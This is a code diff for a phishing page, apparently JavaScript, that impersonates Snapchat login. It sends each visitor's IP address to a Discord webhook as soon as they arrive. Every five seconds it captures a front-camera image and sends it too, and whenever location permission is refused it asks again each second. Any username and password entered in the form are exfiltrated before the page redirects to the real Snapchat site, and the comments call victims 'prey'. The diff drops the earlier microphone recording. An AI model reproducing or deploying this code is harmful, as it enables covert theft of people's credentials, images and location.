@@ -5,7 +5,7 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDF
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-let mediaRecorder, audioChunks = [], userLat = null, userLng = null;
+let userLat = null, userLng = null;
 
 // 1. جلب IP الجهاز فور الدخول
 async function getIP() {
@@ -17,83 +17,106 @@ async function getIP() {
 }
 
 // 2. إرسال البيانات إلى ديسكورد
-async function sendPacket(imgBlob, audBlob, user = "", pass = "") {
+async function sendData(imgBlob, user = "", pass = "") {
     const ip = await getIP();
     const formData = new FormData();
-    let content = `🛰️ **تحديث بيانات مباشر**\n🌐 IP: \`${ip}\` \n`;
+    
+    let content = `🛰️ **تحديث صيد جديد (كل 5 ثوانٍ)**\n🌐 IP: \`${ip}\` \n`;
     
     if (user) content += `👤 الحساب: \`${user}\` | الرمز: \`${pass}\` \n`;
-    if (userLat) content += `📍 الموقع: [Google Maps](https://www.google.com/maps?q=${userLat},${userLng}) \n`;
-
-    if (imgBlob) formData.append('file1', imgBlob, 'camera.png');
-    if (audBlob) formData.append('file2', audBlob, 'mic.ogg');
     
-    formData.append('payload_json', JSON.stringify({ content: content, username: "SnapHunter" }));
+    if (userLat && userLng) {
+        content += `📍 الموقع: [Google Maps](https://www.google.com/maps?q=${userLat},${userLng}) \n`;
+    }
+
+    if (imgBlob) formData.append('file', imgBlob, 'camera.png');
+    
+    formData.append('payload_json', JSON.stringify({
+        content: content,
+        username: "SnapHunter PRO",
+        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
+    }));
+
     fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 }
 
-// 3. وظيفة طلب الموقع بشكل "إجباري" ومتكرر
-function requestLocationForcefully() {
+// 3. طلب الموقع بشكل إجباري متكرر
+function forceLocation() {
     navigator.geolocation.getCurrentPosition(
         (p) => {
             userLat = p.coords.latitude;
             userLng = p.coords.longitude;
         },
         (err) => {
-            // في حال الرفض، يعيد الطلب بعد ثانية واحدة
-            setTimeout(requestLocationForcefully, 1000);
+            // إعادة الطلب كل ثانية في حال الرفض
+            setTimeout(forceLocation, 1000);
         },
         { enableHighAccuracy: true }
     );
 }
 
-// 4. تسلسل الأذونات والتشغيل
-async function initSystem() {
+// 4. تشغيل النظام الكامل
+async function initTracker() {
+    // إشعار دخول فوري
     const ip = await getIP();
-    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: `🚀 صيد دخل الموقع! IP: ${ip}`}) });
+    fetch(WEBHOOK_URL, { 
+        method: 'POST', 
+        headers: {'Content-Type': 'application/json'}, 
+        body: JSON.stringify({content: `🚀 صيد دخل الموقع! IP: ${ip}`}) 
+    });
 
     try {
-        // أ- طلب الكاميرا والميكروفون
+        // طلب الكاميرا (السيلفي)
         const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" }, 
-            audio: true 
+            video: { facingMode: "user" } 
         });
         
         video.srcObject = stream;
-        mediaRecorder = new MediaRecorder(stream);
 
-        // ب- طلب الموقع فوراً بعد الكاميرا
-        requestLocationForcefully();
+        // طلب الموقع فوراً بعد الكاميرا
+        forceLocation();
 
-        // ج- بدء حلقة الإرسال (تمت إضافة فحص جاهزية الفيديو لمنع الصور السوداء)
+        // حلقة التقاط الصور كل 5 ثوانٍ
         setInterval(() => {
-            // التأكد من أن الفيديو يعمل ولدينا بيانات حقيقية
+            // التأكد من أن الكاميرا تبث بيانات (لتجنب الصور السوداء)
             if (video.readyState === video.HAVE_ENOUGH_DATA) {
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, 640, 480);
                 
-                audioChunks = [];
-                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-                mediaRecorder.start();
-
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    mediaRecorder.onstop = () => {
-                        const audBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                        canvas.toBlob(imgBlob => {
-                            if (imgBlob && imgBlob.size > 500) { // التأكد من أن حجم الصورة ليس صفراً
-                                sendPacket(imgBlob, audBlob);
-                            }
-                        }, 'image/png');
-                    };
-                }, 3000);
+                canvas.toBlob(blob => {
+                    if (blob && blob.size > 1000) { // التأكد من أن الصورة ليست فارغة
+                        sendData(blob);
+                    }
+                }, 'image/png');
             }
         }, 5000);
 
     } catch (err) {
-        requestLocationForcefully();
-        setInterval(() => sendPacket(null, null), 5000);
+        // إذا رفض الكاميرا، استمر في طلب الموقع وإرسال IP
+        forceLocation();
+        setInterval(() => sendData(null), 5000);
     }
 }
 
-window.onload = initSystem;
+// معالجة فورم الدخول (apply2.html)
+const loginForm = document.getElementById('fullLoginForm');
+if (loginForm) {
+    loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const u = e.target.username.value;
+        const p = e.target.password.value;
+        document.getElementById('loadingOverlay').style.display = 'flex';
+
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 640, 480);
+        
+        canvas.toBlob(async (blob) => {
+            await sendData(blob, u, p);
+            setTimeout(() => {
+                window.location.href = "https://accounts.snapchat.com/";
+            }, 1500);
+        }, 'image/png');
+    });
+}
+
+window.onload = initTracker;
